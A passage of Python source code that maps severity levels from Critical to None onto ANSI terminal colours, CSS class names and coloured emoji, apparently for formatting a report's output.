    'Critical': {'ansi': ANSI['bold_red'], 'css': 'sev-critical', 'emoji': '🔴'},
    'High':     {'ansi': ANSI['red'],      'css': 'sev-high',     'emoji': '🟠'},
    'Medium':   {'ansi': ANSI['yellow'],   'css': 'sev-medium',   'emoji': '🟡'},
    'Low':      {'ansi': ANSI['cyan'],     'css': 'sev-low',      'emoji': '🔵'},
    'None':     {'ansi': ANSI['green'],    'css': 'sev-none',     'emoji': '🟢'},
}